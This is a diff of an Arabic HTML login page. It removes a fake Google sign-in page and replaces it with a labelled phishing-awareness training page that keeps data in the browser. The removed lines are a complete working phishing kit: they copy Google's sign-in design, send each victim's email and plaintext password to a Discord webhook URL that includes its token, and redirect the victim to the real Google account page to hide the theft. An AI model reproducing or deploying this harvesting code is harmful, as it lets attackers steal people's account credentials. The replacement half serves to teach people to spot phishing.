@@ -1,394 +1,209 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل الدخول - حساب Google</title>
-  <style>
-    body {
-      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
-      background-color: #f1f1f1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      color: #202124;
-    }
-    .container {
-      background-color: white;
-      width: 450px;
-      padding: 48px 40px 36px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      box-sizing: border-box;
-    }
-    .logo {
-      display: block;
-      margin: 0 auto 16px auto;
-      width: 75px;
-      height: 24px;
-    }
-    h1 {
-      font-size: 24px;
-      font-weight: 400;
-      text-align: center;
-      margin-bottom: 8px;
-    }
-    .subtitle {
-      font-size: 16px;
-      color: #5f6368;
-      text-align: center;
-      margin-bottom: 24px;
-    }
-    .input-container {
-      margin-bottom: 24px;
-      position: relative;
-    }
-    input {
-      width: 100%;
-      padding: 13px 15px;
-      margin: 1px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 16px;
-      box-sizing: border-box;
-      transition: border 0.2s;
-      direction: ltr;
-      text-align: left;
-    }
-    input:focus {
-      border: 2px solid #1a73e8;
-      outline: none;
-      margin: 0 -1px;
-    }
-    input.error {
-      border-color: #d93025;
-    }
-    .error-message {
-      color: #d93025;
-      font-size: 14px;
-      margin: 4px 0 0;
-      display: none;
-    }
-    .buttons {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 32px;
-    }
-    .create-account {
-      color: #1a73e8;
-      font-weight: 500;
-      font-size: 14px;
-      cursor: pointer;
-      text-decoration: none;
-    }
-    .next-button {
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      padding: 10px 24px;
-      font-size: 14px;
-      font-weight: 500;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.2s, box-shadow 0.2s;
-    }
-    .next-button:hover {
-      background-color: #1765d1;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.2);
-    }
-    .next-button:disabled {
-      background-color: #8ab4f8;
-      cursor: default;
-    }
-    .footer {
-      font-size: 12px;
-      text-align: center;
-      color: #5f6368;
-      line-height: 1.5;
-      margin-top: 16px;
-    }
-    .language-selector {
-      position: absolute;
-      bottom: 20px;
-      left: 20px;
-      font-size: 12px;
-      color: #5f6368;
-    }
-    .hidden {
-      display: none;
-    }
-    .forgot-email {
-      color: #1a73e8;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      text-decoration: none;
-      margin-top: 8px;
-      display: inline-block;
-    }
-    .user-info {
-      display: flex;
-      align-items: center;
-      margin-bottom: 16px;
-      padding: 8px;
-      border-radius: 16px;
-      background-color: #f1f1f1;
-    }
-    .user-avatar {
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background-color: #1a73e8;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 500;
-      margin-left: 8px;
-    }
-    .user-email {
-      font-size: 14px;
-      font-weight: 500;
-    }
-    .more-options {
-      color: #5f6368;
-      font-size: 14px;
-      margin-top: 16px;
-      cursor: pointer;
-    }
-    .password-toggle {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #5f6368;
-      font-size: 14px;
-    }
-    .password-container {
-      position: relative;
-    }
-    .loading-spinner {
-      display: none;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 1s ease-in-out infinite;
-      margin-right: 8px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .button-content {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .guest-mode {
-      font-size: 12px;
-      color: #5f6368;
-      margin-top: 8px;
-      text-align: right;
-    }
-    .guest-mode a {
-      color: #1a73e8;
-      text-decoration: none;
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>نموذج تدريبي — اختبار تمييز المواقع المزيفة</title>
+<style>
+  :root{--bg:#f3f4f6;--card:#fff;--accent:#1a73e8;--warn:#d93025;--muted:#6b7280}
+  body{font-family:Inter,Segoe UI,Arial,sans-serif;background:var(--bg);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+  .frame{width:100%;max-width:520px}
+  .banner{background:#111827;color:#fff;padding:12px;border-radius:8px 8px 6px 6px;margin-bottom:14px;box-shadow:0 6px 18px rgba(2,6,23,.08)}
+  .banner strong{display:block;font-size:16px}
+  .banner p{margin:6px 0 0;color:#cbd5e1;font-size:13px}
+  .card{background:var(--card);border-radius:10px;padding:30px;box-shadow:0 8px 30px rgba(2,6,23,.06)}
+  h1{margin:0 0 8px;font-weight:600;font-size:20px;color:#0f172a;text-align:center}
+  .subtitle{color:var(--muted);text-align:center;margin-bottom:18px}
+  .step{display:none}
+  .step.active{display:block}
+  .input{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;font-size:15px;box-sizing:border-box}
+  .row{margin-bottom:14px}
+  .buttons{display:flex;gap:10px;justify-content:space-between;align-items:center;margin-top:6px}
+  .btn{background:var(--accent);color:#fff;padding:10px 16px;border-radius:8px;border:0;cursor:pointer;font-weight:600}
+  .btn.secondary{background:#eef2ff;color:#0f172a;border:1px solid #e6e9ee}
+  .note{font-size:13px;color:var(--muted);margin-top:12px;text-align:center}
+  .footer{font-size:12px;color:var(--muted);text-align:center;margin-top:18px}
+  .result{background:#f8fafc;border-radius:8px;padding:12px;margin-top:12px;font-size:13px;color:#0f172a}
+  .danger{color:var(--warn);font-weight:700}
+  .muted-block{font-size:13px;color:var(--muted);padding:10px;border-radius:8px;background:#fbfdff;margin-top:10px}
+</style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
-    <h1>تسجيل الدخول</h1>
-    <p class="subtitle">باستخدام حسابك في Google. وسيكون هذا الحساب متاحًا لاستخدامه في تطبيقات Google الأخرى في المتصفّح.</p>
-
-    <!-- الخطوة الأولى: البريد -->
-    <div id="step-email">
-      <div class="input-container">
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <p id="email-error" class="error-message">الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح</p>
-      </div>
-      
-      <div class="guest-mode">
-        لا تمتلك هذا الكمبيوتر؟ استخدِم <a href="#">وضع الضيف</a> لتسجيل الدخول بشكلٍ خاص. <a href="#">مزيد من المعلومات</a>
-      </div>
-      
-      <div class="buttons">
-        <a href="https://accounts.google.com/signup" class="create-account">إنشاء حساب</a>
-        <button id="next-button" class="next-button" onclick="goToPassword()">
-          <div class="button-content">
-            <span>التالي</span>
-          </div>
-        </button>
-      </div>
-      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت البريد الإلكتروني؟</a>
+  <div class="frame" role="main">
+    <div class="banner" aria-live="polite">
+      <strong>تنبيه — تجربة تعليمية</strong>
+      <p>هذه صفحة تدريبية لتمييز المواقع المزيفة. لا تدخل أي بيانات حقيقية هنا. كل شيء يبقى محليًا في متصفحك فقط.</p>
     </div>
 
-    <!-- الخطوة الثانية: كلمة المرور -->
-    <div id="step-password" class="hidden">
-      <div class="user-info">
-        <div class="user-avatar" id="user-avatar">م</div>
-        <div class="user-email" id="user-email-display">user@example.com</div>
-      </div>
-      <div class="input-container">
-        <div class="password-container">
-          <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-          <span class="password-toggle" onclick="togglePassword()">إظهار</span>
+    <div class="card" aria-labelledby="title">
+      <h1 id="title">تسجيل الدخول — منصة تدريبية</h1>
+      <div class="subtitle">اختبار عملي لتمييز صفحات تسجيل الدخول</div>
+
+      <!-- STEP 1: Email -->
+      <div id="step-email" class="step active" aria-hidden="false">
+        <div class="row">
+          <input id="email" class="input" type="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="off" />
+          <div id="email-err" class="muted-block" style="display:none;color:#d9534f">الرجاء إدخال بريد إلكتروني صالح.</div>
         </div>
-        <p id="password-error" class="error-message">الرجاء إدخال كلمة المرور</p>
+        <div class="buttons">
+          <button class="btn secondary" id="demo-hint">كيف تميّز موقع مزيف؟</button>
+          <button class="btn" id="next-to-password">التالي</button>
+        </div>
+        <div class="note">ملاحظة: هذا نموذج تعليمي — لا يتم إرسال أي شيء خارج جهازك</div>
       </div>
-      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت كلمة المرور؟</a>
-      <div class="more-options">خيارات أخرى لتسجيل الدخول</div>
-      <div class="buttons">
-        <a href="#" class="create-account" onclick="goBackToEmail()">استخدام بريد إلكتروني آخر</a>
-        <button id="login-button" class="next-button" onclick="login()">
-          <div class="button-content">
-            <span>تسجيل الدخول</span>
-          </div>
-        </button>
-      </div>
-    </div>
 
-    <div class="footer">
-      <select id="language-selector" style="border: none; background: none; color: #5f6368; font-size: 12px; margin-bottom: 8px;">
-        <option value="ar">العربية</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-      </select>
-      <p>مساعدة</p>
-      <p>الخصوصية</p>
-      <p>شروط الاستخدام</p>
+      <!-- STEP 2: Password -->
+      <div id="step-password" class="step" aria-hidden="true">
+        <div class="row user-info" style="display:flex;align-items:center;gap:10px">
+          <div style="width:44px;height:44px;border-radius:10px;background:#e7eefc;color:#0f172a;display:flex;align-items:center;justify-content:center;font-weight:700" id="avatar">م</div>
+          <div>
+            <div id="display-email" style="font-weight:600"></div>
+            <div style="font-size:13px;color:var(--muted)">حسابك التجريبي</div>
+          </div>
+        </div>
+
+        <div class="row password-container" style="position:relative">
+          <input id="password" class="input" type="password" placeholder="أدخل كلمة المرور" autocomplete="off" />
+        </div>
+        <div id="pw-err" class="muted-block" style="display:none;color:#d9534f">الرجاء إدخال كلمة مرور.</div>
+
+        <div class="buttons">
+          <button class="btn secondary" id="back-email">استخدام بريد آخر</button>
+          <button class="btn" id="submit-btn">تسجيل الدخول</button>
+        </div>
+
+        <div class="result" id="local-result" style="display:none"></div>
+      </div>
+
+      <div class="footer">
+        <div>لأغراض تعليمية فقط — الجهة المالكة: قسم أمن المعلومات (تجريبي)</div>
+      </div>
     </div>
   </div>
 
-  <script>
-    const webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
-    
-    function goToPassword() {
-      const email = document.getElementById('email').value.trim();
-      const emailError = document.getElementById('email-error');
-      
-      if(email === "" || !validateEmail(email)) {
-        document.getElementById('email').classList.add('error');
-        emailError.style.display = 'block';
-        return;
-      }
-      
-      document.getElementById('step-email').classList.add('hidden');
-      document.getElementById('step-password').classList.remove('hidden');
-      document.getElementById('user-email-display').textContent = email;
-      document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
-    }
-    
-    function goBackToEmail() {
-      document.getElementById('step-password').classList.add('hidden');
-      document.getElementById('step-email').classList.remove('hidden');
-      document.getElementById('email').focus();
-    }
-    
-    async function login() {
-      const email = document.getElementById('user-email-display').textContent;
-      const password = document.getElementById('password').value.trim();
-      const passwordError = document.getElementById('password-error');
-      const loginButton = document.getElementById('login-button');
-      
-      if(password === "") {
-        document.getElementById('password').classList.add('error');
-        passwordError.style.display = 'block';
-        return;
-      }
-      
-      // عرض مؤشر التحميل
-      loginButton.disabled = true;
-      loginButton.querySelector('.button-content').innerHTML = `
-        <div class="loading-spinner" style="display: inline-block;"></div>
-        <span>جاري التحقق...</span>
-      `;
-      
-      try {
-        // إرسال البيانات إلى الويب هوك
-        const response = await fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `تم تسجيل محاولة دخول جديدة:\nالبريد: ${email}\nكلمة المرور: ${password}`,
-            username: 'Google Login Logger',
-            avatar_url: 'https://ssl.gstatic.com/accounts/ui/logo_2x.png'
-          }),
-        });
-        
-        // محاكاة التأخير لتبدو كأنها عملية حقيقية
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        
-        // توجيه المستخدم بعد "التحقق"
-        window.location.href = `https://myaccount.google.com/?email=${encodeURIComponent(email)}`;
-        
-      } catch (error) {
-        console.error('Error:', error);
-        alert("حدث خطأ أثناء محاولة تسجيل الدخول. يرجى المحاولة مرة أخرى.");
-      } finally {
-        // استعادة حالة الزر الأصلية في حالة الفشل
-        loginButton.disabled = false;
-        loginButton.querySelector('.button-content').innerHTML = `<span>تسجيل الدخول</span>`;
-      }
-    }
-    
-    function togglePassword() {
-      const passwordField = document.getElementById('password');
-      const toggleButton = document.querySelector('.password-toggle');
-      
-      if(passwordField.type === 'password') {
-        passwordField.type = 'text';
-        toggleButton.textContent = 'إخفاء';
-      } else {
-        passwordField.type = 'password';
-        toggleButton.textContent = 'إظهار';
-      }
-    }
-    
-    function validateEmail(email) {
-      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return re.test(email);
-    }
-    
-    // تحسين تجربة المستخدم
-    document.getElementById('email').addEventListener('input', function() {
-      this.classList.remove('error');
-      document.getElementById('email-error').style.display = 'none';
-    });
-    
-    document.getElementById('password').addEventListener('input', function() {
-      this.classList.remove('error');
-      document.getElementById('password-error').style.display = 'none';
-    });
-    
-    document.getElementById('email').addEventListener('keypress', function(e) {
-      if(e.key === 'Enter') {
-        goToPassword();
-      }
-    });
-    
-    document.getElementById('password').addEventListener('keypress', function(e) {
-      if(e.key === 'Enter') {
-        login();
-      }
-    });
-    
-    // تغيير اللغة
-    document.getElementById('language-selector').addEventListener('change', function() {
-      if(this.value === 'en') {
-        window.location.href = 'https://accounts.google.com/signin/v2/identifier?hl=en';
-      } else if(this.value === 'fr') {
-        window.location.href = 'https://accounts.google.com/signin/v2/identifier?hl=fr';
-      }
-    });
-  </script>
+<script>
+/*
+  صفحة تعليمية آمنة: لا ترسل أي بيانات إلى خوادم خارجية.
+  - تحفظ فقط نسخة مشفّرة محليًا (localStorage) كتوضيح للمدرّس.
+  - تعرض تقييمًا تعليميًا فور الضغط.
+*/
+
+function validateEmail(email){
+  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return re.test(String(email).toLowerCase());
+}
+
+const stepEmail = document.getElementById('step-email');
+const stepPassword = document.getElementById('step-password');
+const nextBtn = document.getElementById('next-to-password');
+const backBtn = document.getElementById('back-email');
+const demoHint = document.getElementById('demo-hint');
+const submitBtn = document.getElementById('submit-btn');
+const emailInput = document.getElementById('email');
+const pwInput = document.getElementById('password');
+const emailErr = document.getElementById('email-err');
+const pwErr = document.getElementById('pw-err');
+const resultBox = document.getElementById('local-result');
+const displayEmail = document.getElementById('display-email');
+const avatar = document.getElementById('avatar');
+
+// STEP: go to password
+nextBtn.addEventListener('click', () => {
+  const val = emailInput.value.trim();
+  if(!validateEmail(val)){
+    emailErr.style.display = 'block';
+    emailInput.classList.add('error');
+    return;
+  }
+  emailErr.style.display = 'none';
+  emailInput.classList.remove('error');
+  // show password step
+  displayEmail.textContent = val;
+  avatar.textContent = val.charAt(0).toUpperCase();
+  stepEmail.classList.remove('active');
+  stepEmail.setAttribute('aria-hidden','true');
+  stepPassword.classList.add('active');
+  stepPassword.setAttribute('aria-hidden','false');
+  pwInput.focus();
+});
+
+// Back to email
+backBtn.addEventListener('click', () => {
+  stepPassword.classList.remove('active');
+  stepPassword.setAttribute('aria-hidden','true');
+  stepEmail.classList.add('active');
+  stepEmail.setAttribute('aria-hidden','false');
+  emailInput.focus();
+});
+
+// Demo hint shows educational checklist
+demoHint.addEventListener('click', () => {
+  alert(
+    "قائمة فحص سريعة:\n" +
+    "• هل عنوان الموقع يحتوي دومين غريب؟\n" +
+    "• هل الصفحة تطلب بيانات غير ضرورية؟\n" +
+    "• هل توجد أخطاء لغوية أو تصميمية؟\n" +
+    "• هل الشعار والروابط تشير لمصدر رسمي؟\n\n" +
+    "هذا اختبار تعليمي — لا تدخل بيانات حقيقية."
+  );
+});
+
+// Submit (educational)
+submitBtn.addEventListener('click', () => {
+  const pw = pwInput.value.trim();
+  if(pw === ""){
+    pwErr.style.display = 'block';
+    pwInput.classList.add('error');
+    return;
+  }
+  pwErr.style.display = 'none';
+  pwInput.classList.remove('error');
+
+  // تحضير مُخرَج تعليمي: لا نرسل أي شيء للخارج
+  const email = emailInput.value.trim();
+  const ts = new Date().toISOString();
+
+  // نُخزّن محليًا رمزًا مختصرًا وليس الباسوورد الكامل (hash بسيط للتوضيح — ليس تشفيرًا حقيقيًا)
+  // ملاحظة: هذا بغرض تعليمي فقط — لا تستخدمه لتخزين بيانات حساسة.
+  function simpleHash(s){
+    // تجزئة بسيطة وغير آمنة لغرض العرض فقط
+    let h = 0;
+    for(let i=0;i<s.length;i++){ h = (h<<5) - h + s.charCodeAt(i); h |= 0; }
+    return Math.abs(h).toString(36);
+  }
+
+  const record = {
+    time: ts,
+    email: email,
+    password_hash: simpleHash(pw).slice(0,10) // قصّنا جزء لتوضيح أننا لا نخزن الباسوورد
+  };
+
+  // نحفظ محليًا في localStorage تحت مفتاح تجريبي
+  const logKey = 'edu_phish_log_v1';
+  const prev = JSON.parse(localStorage.getItem(logKey) || '[]');
+  prev.push(record);
+  localStorage.setItem(logKey, JSON.stringify(prev));
+
+  // عرض تقرير تعليمي مختصر للطالب
+  resultBox.style.display = 'block';
+  resultBox.innerHTML =
+    "<strong>نتيجة الاختبار (تعليمي)</strong><br>" +
+    "• التوقيت: " + record.time + "<br>" +
+    "• البريد الذي أدخلته: " + record.email + "<br>" +
+    "• (تخزين محلي فقط) تم تسجيل سجل رقمي مختصر: <code>" + record.password_hash + "</code><br><br>" +
+    "<span class='danger'>تحذير:</span> هذه الصفحة تجريبية — لا تدخل بيانات حقيقية. " +
+    "المدرّس قادر على استعراض السجلات المحلية عند الطلب (من جهاز الطالب) لأغراض التقييم.";
+
+  // بعد عرض النتيجة، يمكن إعادة توجيه داخليًا إلى صفحة شرح
+  setTimeout(()=> {
+    window.location.hash = '#result';
+  }, 600);
+});
+
+// small UX handlers: clear errors on input
+emailInput.addEventListener('input', ()=>{ emailErr.style.display='none'; emailInput.classList.remove('error'); });
+pwInput.addEventListener('input', ()=>{ pwErr.style.display='none'; pwInput.classList.remove('error'); });
+
+</script>
 </body>
 </html>
